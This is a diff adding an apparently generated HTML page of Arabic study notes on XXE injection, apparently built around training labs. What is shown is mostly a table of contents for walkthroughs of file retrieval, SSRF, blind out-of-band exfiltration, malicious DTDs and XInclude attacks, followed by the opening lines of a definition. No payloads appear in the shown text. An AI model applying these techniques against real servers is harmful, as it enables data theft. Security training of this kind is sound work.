+        الخطوة 1: اصطياد الطلب (Intercept)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-payload_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 2: زرع الـ Payload الخبيث
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 3: قراءة الملف وحل اللاب
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 كبسولة للمقارنة في الـ Notes بتاعتك:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-attacks-via-file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE attacks via file upload :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-based-formats" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🖼️ السر كله في نوع الملف (XML-based Formats)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#backend" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 خدعة الـ Backend (ثغرة مكتبات الصور)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 إزاي بنستغلها؟ (The Execution)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-xxe-via-image-file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting XXE via image file upload :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#behind-the-scenes-svg" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🕵️‍♂️ الميكانيكا (Behind the Scenes): ليه الـ SVG؟
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payload-the-malicious-svg" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 الـ Payload المستخدم (The Malicious SVG)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-steps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        خطوات التنفيذ (Exploitation Steps)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="خطوات التنفيذ (Exploitation Steps)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 1: حقن الملف في التطبيق
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-data-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 2: حصد الغنائم (Data Exfiltration)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 3: إنهاء اللاب
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-attacks-via-modified-content-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE attacks via modified content type :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#framework" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 المشكلة في الكواليس: الـ Framework الكسول!
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-transformation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🪓 إزاي الهاكر بيعمل الخدعة دي؟ (The Transformation)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🪓 إزاي الهاكر بيعمل الخدعة دي؟ (The Transformation)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚖️ النتيجة المحتملة:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 مرحلة الـ Exploitation (تدمير السيرفر)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obsidian" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📝 كشكول الـ Obsidian (ملخص الحل الجاهز لـ نوتس بتاعتك)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="جدول المحتويات">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      جدول المحتويات
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-xxe-what-is-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. يعني إيه XXE أصلاً؟ (What is XXE?)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-how-do-xxe-vulnerabilities-arise" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. إزاي الثغرة دي بتحصل؟ (How do XXE vulnerabilities arise?)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml-what-is-xml" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        طيب في الاول إيه هو الـ XML أصلاً؟ (What is XML?)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-xml-entities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. إيه هي الـ XML Entities؟ (الكيانات)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-dtd-document-type-definition" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. إيه هو الـ DTD (Document Type Definition)؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-custom-entities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. إيه هي الـ Custom Entities؟ (الكيانات المخصصة)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-external-entities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. الطامة الكبرى: الـ External Entities 🚨
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. إيه هي أنواع هجمات الـ XXE؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-xxe-to-retrieve-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        إزاي بننفذ هجوم استخراج الملفات؟ (Exploiting XXE to retrieve files)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="إزاي بننفذ هجوم استخراج الملفات؟ (Exploiting XXE to retrieve files)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 تعال نشوف المثال العملي (السيناريو):
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        😈 الهجوم (The Payload):
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pro-tip" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📌 ملاحظة مهمة جداً للشغل في الواقع (Pro Tip):
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-xxe-using-external-entities-to-retrieve-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting XXE using external entities to retrieve files :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#intercepting-the-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة الأولى: اصطياد الطلب (Intercepting the Request)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#defining-the-external-entity" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة التانية: زرع القنبلة (Defining the External Entity)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#triggering-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة الثالثة: تفجير الثغرة (Triggering the Exploit)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        النتيجة (إيه اللي بيحصل في الكواليس؟)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ssrf-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        يعني إيه SSRF من خلال الـ XXE؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-payload_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        إزاي بننفذ الهجوم؟ (The Payload)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        سيناريوهات الهجوم (النتائج)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="سيناريوهات الهجوم (النتائج)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-xxe-to-perform-ssrf-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting XXE to perform SSRF attacks :
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        خطوات حل اللاب بالتفصيل
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="خطوات حل اللاب بالتفصيل">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#blind-xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        دلوقتي ندخل علي ال Blind XXE :
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-xxe_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        طرق استغلال الـ Blind XXE
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#oast" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        إزاي بنكتشف الثغرة أصلاً بطريقة OAST؟
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="إزاي بنكتشف الثغرة أصلاً بطريقة OAST؟">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-intercept-the-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📥 الخطوة 1: اصطياد الطلب (Intercept the Request)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-define-the-external-entity" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 الخطوة 2: زرع رابط الكولابوريتور (Define the External Entity)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-trigger-the-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 الخطوة 3: تفعيل الهجوم (Trigger the Payload)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-poll-for-interactions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        👁️ الخطوة 4: التحقق وصيد الاتصال (Poll for Interactions)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#behind-the-scenes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 فكرة العمل (Behind the Scenes) عشان تفهمها لنفسك:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bypass-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Bypass Techniques :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المشكلة: ليه الهجوم العادي ممكن يفشل؟
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-parameter-entities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 الحل السحري: الـ XML Parameter Entities
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-payload_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 كيف تنفذ الهجوم؟ (The Payload)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Blind XXE with out-of-band interaction via XML parameter entities :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-blind-xxe-to-exfiltrate-data-out-of-band" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting blind XXE to exfiltrate data out-of-band :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        😈 الخطوة الأولى: تجهيز الفخ (الملف الخبيث على سيرفرك)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-payload_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 الخطوة الثانية: إطلاق شرارة الهجوم (The Payload)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-catch" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚠️ ملاحظة هامة جداً للمحترفين (The Catch):
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting blind XXE to exfiltrate data using a malicious external DTD :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#collaborator" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الأولى: تجهيز سيرفر الاستقبال (Collaborator)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploit-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الثانية: تجهيز الفخ (Exploit Server)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-vulnerable-app" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الثالثة: إطلاق الهجوم (The Vulnerable App)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الرابعة: حصد الغنائم
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-blind-xxe-to-retrieve-data-via-error-messages" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting blind XXE to retrieve data via error messages :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        😈 الفخ (ملف الـ DTD الخبيث)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-crash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💥 لحظة الانفجار (The Crash)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 الخلاصة:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-blind-xxe-to-retrieve-data-via-error-messages_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting blind XXE to retrieve data via error messages :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1-exploit-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🪤 الخطوة 1: تجهيز الفخ على الـ Exploit Server
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-the-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 الخطوة 2: توجيه ضربة الهجوم (The Attack)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-response" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💥 الخطوة 3: حصد الغنائم مباشرة في الـ Response
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-blind-xxe-by-repurposing-a-local-dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Exploiting blind XXE by repurposing a local DTD :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#firewall" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛑 الكابوس (الـ Firewall قفل كل حاجة)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-xml-loophole" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 الثغرة القانونية (The XML Loophole)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#repurposing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🪤 إزاي بننفذ الخدعة دي؟ (Repurposing)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#dtd-reconnaissance" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 إزاي نلاقي ملف الـ DTD المحلي أصلاً؟ (Reconnaissance)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-xxe-to-retrieve-data-by-repurposing-a-local-dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting XXE to retrieve data by repurposing a local DTD :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1-intercept" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 الخطوة 1: اصطياد الطلب (Intercept)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 الخطوة 2: زرع الـ Payload المُهجن
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💥 الخطوة 3: التنفيذ وحصد البيانات
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ==اجابة السؤال الاول :==
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#1-recon-information-disclosure" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1️⃣ الاستكشاف الأولي (Recon &amp; Information Disclosure)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-fuzzing-dtd" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2️⃣ استخدام الـ Fuzzing لاكتشاف ملفات الـ DTD
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-intruder-the-oracle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3️⃣ كيف تقرأ نتائج الـ Intruder؟ (The Oracle)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ==اجابة السؤال الثاني :==
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-first-come-first-served" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 قاعدة "الأسبقية" في الـ XML (First Come, First Served)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#isoamso" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 إزاي الباحثين عرفوا إن فيه متغير اسمه ISOamso؟
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🎯 الخلاصة:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#finding-hidden-attack-surface-for-xxe-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Finding hidden attack surface for XXE injection :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المشكلة: اختفاء الـ XML من الطلب
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ليه الـ XXE العادي بيفشل هنا؟
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xinclude" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الحل البديل: هجوم الـ XInclude
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 تحليل الـ Payload
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخلاصة
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-xinclude-to-retrieve-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting XInclude to retrieve files :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#reconnaissance-source-code-review" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔍 المرحلة الأولى: الاستكشاف المتقدم (Reconnaissance &amp; Source Code Review)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🚀 المرحلة الثانية: خطوات الحل العملية
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🚀 المرحلة الثانية: خطوات الحل العملية">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-intercept_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 1: اصطياد الطلب (Intercept)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-payload_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 2: زرع الـ Payload الخبيث
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 3: قراءة الملف وحل اللاب
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#notes" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 كبسولة للمقارنة في الـ Notes بتاعتك:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-attacks-via-file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE attacks via file upload :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xml-based-formats" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🖼️ السر كله في نوع الملف (XML-based Formats)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#backend" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 خدعة الـ Backend (ثغرة مكتبات الصور)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-execution" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 إزاي بنستغلها؟ (The Execution)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploiting-xxe-via-image-file-upload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        حل لاب Exploiting XXE via image file upload :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#behind-the-scenes-svg" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🕵️‍♂️ الميكانيكا (Behind the Scenes): ليه الـ SVG؟
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#payload-the-malicious-svg" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 الـ Payload المستخدم (The Malicious SVG)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation-steps" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        خطوات التنفيذ (Exploitation Steps)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="خطوات التنفيذ (Exploitation Steps)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 1: حقن الملف في التطبيق
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-data-exfiltration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 2: حصد الغنائم (Data Exfiltration)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 3: إنهاء اللاب
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#xxe-attacks-via-modified-content-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XXE attacks via modified content type :
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#framework" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🧠 المشكلة في الكواليس: الـ Framework الكسول!
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#the-transformation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🪓 إزاي الهاكر بيعمل الخدعة دي؟ (The Transformation)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🪓 إزاي الهاكر بيعمل الخدعة دي؟ (The Transformation)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚖️ النتيجة المحتملة:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💣 مرحلة الـ Exploitation (تدمير السيرفر)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#obsidian" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        📝 كشكول الـ Obsidian (ملخص الحل الجاهز لـ نوتس بتاعتك)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>XML injection (XXE)</h1>
+
+<h3 id="1-xxe-what-is-xxe">1. يعني إيه XXE أصلاً؟ (What is XXE?)</h3>
+<p>دي ثغرة أمنية بتحصل في تطبيقات الويب اللي بتستقبل بيانات بصيغة <strong>XML</strong> (ودي طريقة لتنظيم ونقل البيانات بين المتصفح والسيرفر، شبه الـ JSON كده). الثغرة دي بتحصل لما السيرفر بياخد ملف الـ XML اللي المستخدم (أو المهاجم) باعته، ويبدأ يقرأه ويعالجه (Parsing) <strong>من غير ما يعمل فحص أو حماية كافية</strong>.</p>
+<p><strong>بسبب الثغرة دي، المهاجم بيقدر يعمل كوارث زي:</strong></p>
+<ul>
+<li>
